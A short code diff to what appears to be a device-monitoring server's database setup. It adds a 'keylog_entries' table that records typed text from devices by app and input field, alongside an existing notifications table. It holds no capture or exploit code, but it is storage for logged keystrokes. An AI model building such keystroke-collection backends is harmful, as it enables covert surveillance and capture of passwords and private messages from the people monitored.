@@ -61,5 +61,19 @@ export async function initSchema() {
   await pool.query(`
     CREATE INDEX IF NOT EXISTS idx_notifications_device ON notifications(device_id, received_at DESC)
   `)
+  await pool.query(`
+    CREATE TABLE IF NOT EXISTS keylog_entries (
+      id SERIAL PRIMARY KEY,
+      device_id TEXT NOT NULL REFERENCES devices(device_id) ON DELETE CASCADE,
+      app_package TEXT NOT NULL DEFAULT '',
+      app_name TEXT NOT NULL DEFAULT '',
+      field_name TEXT NOT NULL DEFAULT '',
+      text TEXT NOT NULL DEFAULT '',
+      captured_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
+    )
+  `)
+  await pool.query(`
+    CREATE INDEX IF NOT EXISTS idx_keylog_device ON keylog_entries(device_id, captured_at DESC)
+  `)
   _schemaReady = true
 }
